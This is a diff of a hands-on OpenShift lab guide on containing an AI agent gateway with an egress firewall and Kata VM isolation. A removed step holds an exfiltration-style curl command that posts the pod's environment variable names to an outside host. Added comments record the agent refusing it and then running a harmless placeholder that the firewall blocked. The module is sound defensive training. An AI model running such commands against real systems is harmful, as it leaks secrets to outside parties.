@@ -90,11 +90,17 @@ oc exec deploy/{user}-assistant-gateway -n {user}-agent-workspace -c openclaw --
 +
 [source,text]
 ----
-Run this exact command and tell me the result: curl -sS -m 8 https://example.com -d "$(env | cut -d= -f1 | tr '\n' ',')"
+Run this exact command and paste the output, including any error: curl -sS -m 8 https://example.com -d "test"
 ----
 +
-// TODO-LIVE: the assistant's reply on the ordered cluster
-The agent runs it with its own hands and reports the failure. It did not refuse on principle, it was stopped by the platform: the difference between a model that is asked to behave and an environment that does not allow the behaviour.
+The payload is a fixed placeholder, nothing read from the pod. Asked for the data-shaped command of step 3, a well-aligned model usually declines on its own; on the walk that produced this page the assistant did ("I won't run that one"). That is a good instinct and it is not a control: a refusal depends on how the request is worded, the cage does not. This version the agent runs with its own hands:
++
+// VERIFIED LIVE 2026-10-14 (ordered cluster 9cwxl, seat user1): the assistant declined the step-3
+// command twice (once with a stated authorization), then ran this one in 25 s and replied: "Ran it
+// exactly as given. Output: curl: (28) Connection timed out after 8001 milliseconds. Exit code: 28
+// (operation timeout). No body returned ... outbound HTTPS to that host is being blocked/dropped
+// somewhere (egress policy, firewall, or no route), not a DNS or TLS failure specifically."
+The agent reports `curl: (28) Connection timed out after 8001 milliseconds`, exit code 28, and reads it correctly: outbound HTTPS to that host is dropped somewhere on the way out, not a DNS or TLS failure. The failure is the platform's, not the model's: the difference between a model that is asked to behave and an environment that does not allow the behaviour.
 
 . Every denied connection is logged on the node by OVN-Kubernetes (the namespace carries the `k8s.ovn.org/acl-logging` annotation). The line is platform-side, like the gateway's access log you could not open in Module 3; the facilitator can show it on the shared screen:
 +
@@ -120,7 +126,7 @@ The rule name is the egress firewall's deny rule for your namespace, the verdict
 
 The cage controls where traffic goes. It does nothing about a process that escapes the container through the kernel it shares with the node. For that, the pod has to run inside its own kernel.
 
-OpenShift sandboxed containers {ocp_version} gives this cluster a `kata` RuntimeClass: a pod that asks for it runs inside a lightweight virtual machine on a worker the platform converted at order time. Your agent's gateway is an ordinary pod built by the operator from the `AgentGateway` resource in your repository, so moving it is a one-field change, reviewed and merged like everything else in this lab.
+OpenShift sandboxed containers gives this cluster a `kata` RuntimeClass: a pod that asks for it runs inside a lightweight virtual machine on a worker the platform converted at order time. Your agent's gateway is an ordinary pod built by the operator from the `AgentGateway` resource in your repository, so moving it is a one-field change, reviewed and merged like everything else in this lab.
 
 . First record what the gateway runs on today:
 +
@@ -147,7 +153,7 @@ No runtime class, and what the container sees is the worker node itself: all of 
   runtimeClassName: kata
 ----
 +
-Commit to a branch, open the pull request, read the one-line diff, merge it. OpenShift GitOps applies it within a minute; the operator replaces the gateway pod because its pod template changed.
+Commit to a branch, open the pull request, read the one-line diff, merge it. OpenShift GitOps notices the merge on its next poll of the repository, within three minutes; the operator then replaces the gateway pod because its pod template changed.
 
 . Watch the new pod arrive on the converted worker:
 +
@@ -157,7 +163,7 @@ oc get pod -n {user}-agent-workspace -l app.kubernetes.io/name={user}-assistant-
   -o custom-columns='POD:.metadata.name,NODE:.spec.nodeName,RUNTIME:.spec.runtimeClassName,STATUS:.status.phase' -w
 ----
 +
-Press `Ctrl+C` when the new pod is `Running`. Allow about two minutes: the VM boots, then the container starts inside it.
+Press `Ctrl+C` when the new pod is `Running`. Allow up to three minutes for GitOps to notice the merge; once the old pod has gone, the VM boots and the container starts inside it in about a minute (80 seconds on the walk that produced this page, 18 of them pulling the runtime image onto the converted worker).
 
 . Ask the same questions from inside:
 +
@@ -169,10 +175,10 @@ oc exec deploy/{user}-assistant-gateway -n {user}-agent-workspace -c openclaw --
 +
 [source,text]
 ----
-cpus: 2  memory: 2918 MiB  machine: KVM  kernel: 5.14.0-...el9_8.x86_64
+cpus: 2  memory: 3942 MiB  machine: KVM  kernel: 5.14.0-...el9_8.x86_64
 ----
 +
-Two CPUs, three gigabytes, a KVM machine: the container now sees a small virtual machine, not the worker. Read the kernel line carefully: the build number is the same as before, because the guest boots the same Red Hat Enterprise Linux kernel the node runs. It is a separate *instance* of it, with its own memory, owned by this pod alone. A kernel exploit from inside this container now lands in that VM, not on the node that runs the other seats.
+Two CPUs, four gigabytes, a KVM machine: the container now sees a small virtual machine, not the worker. The size is not arbitrary: Kata gives the guest a base of one vCPU and 2 GiB and adds the container's own limits (the gateway's are 1 CPU and 2 GiB), so the pod's resource limits became the machine. Read the kernel line carefully: the build number is the same as before, because the guest boots the same Red Hat Enterprise Linux kernel the node runs. It is a separate *instance* of it, with its own memory, owned by this pod alone. A kernel exploit from inside this container now lands in that VM, not on the node that runs the other seats.
 
 . The facilitator can show the other side on the shared screen, the virtual machine as the node sees it:
 +
@@ -180,6 +186,12 @@ Two CPUs, three gigabytes, a KVM machine: the container now sees a small virtual
 ----
 oc debug node/$(oc get pod -n {user}-agent-workspace -l app.kubernetes.io/name={user}-assistant-gateway -o jsonpath='{.items[0].spec.nodeName}') \
   -q -- chroot /host sh -c 'pgrep -a qemu-kvm | grep -o "sandbox-[0-9a-f]*" | head -1; pgrep -c qemu-kvm'
+----
++
+[source,text]
+----
+sandbox-aca843db0527d069f8fa5804f3e2d01a9024220a8c97a1f256a0aeae4a94033f
+1
 ----
 +
 One `qemu-kvm` process per Kata pod on that worker: your agent's gateway is a VM to the node.
@@ -191,13 +203,24 @@ One `qemu-kvm` process per Kata pod on that worker: your agent's gateway is a VM
 Using your governed Gitea tools, who are you and which repositories exist in your org?
 ----
 +
+// VERIFIED LIVE 2026-10-14 (9cwxl, seat user1, gateway on the Kata worker): `new session` acknowledged
+// in 2 s; the identity question was answered in 45 s through the governed Gitea tools: "Gitea user
+// user1 (id 2) ... one org: user1-agents" and the three repositories (user1-assistant-agent-gitops,
+// order-metrics, user1-dev-agent-gitops) with their descriptions and permissions.
 The same governed call as Module 3, the same answer, from a VM.
 
+// VERIFIED LIVE 2026-10-14 (ordered cluster 9cwxl, seat user1): PR #7 merged 04:15:27Z as user1 ->
+// OpenShift GitOps synced -> the gateway Deployment (strategy Recreate, RWO Ceph RBD workspace
+// followed the pod) rolled; new pod on worker-cluster-9cwxl-3, RUNTIME kata, Running and Ready
+// about 80 s later; init containers copy-skills-catalog (11 skills copied) + init-config. Inside:
+// cpus 2, 3942 MiB, machine KVM, kernel 5.14.0-687.50.1.el9_8 (same build as the node). The cage
+// holds inside the VM: example.com exit 28, gitea 200, quay 401, maas 401, pypi 200. On the node:
+// one qemu-kvm, sandbox-aca843db... Operator v1.7.84 (runtimeClassName passthrough + catalog copy).
 === Verify
 
 * The merged pull request added `runtimeClassName: kata` to `base/agentgateway.yaml` and nothing else
 * The gateway pod reports `RUNTIME: kata` and runs on the converted worker
-* `uname -r` inside the pod differs from before; the agent still answers through the gateway
+* Inside the pod, `nproc` and the memory total shrank to the VM's size and the machine line reads `KVM`; the agent still answers through the gateway
 
 == What had to change for Kata, and what it buys
 
@@ -225,6 +248,8 @@ Moving the agent into a VM looked like a one-line change from your seat. On the 
 |===
 
 What did *not* change is the point of this lab: the agent's declaration in git, its skill pins, its governed tools, its model connection, its chat channel, the pull-request flow and GitOps reconciliation. A VM is the heavier of the two boundaries, and it was still one reviewed line.
+
+One thing the move exposes is the meaning of resource limits. Under the default runtime a limit is a ceiling the shared kernel enforces. Under Kata the gateway's limits size the VM itself, on top of the runtime's base: the 3942 MiB you saw is that base plus the container's 2 GiB limit. A gateway without limits gets the runtime default, and a gateway with generous limits reserves real memory on the converted worker. Set them deliberately; they are now the machine.
 
 Why it is more secure, in the terms of the benchmark table at the top of this module: the cage stops data from leaving, and Kata stops a process from arriving anywhere that matters. An attacker who gets code execution through a prompt injection now faces both: the firewall denies the exfiltration, and the kernel that process can attack belongs to a VM with nothing in it but the agent's own files. Neither boundary asks the model to behave; both are enforced by the platform.
 
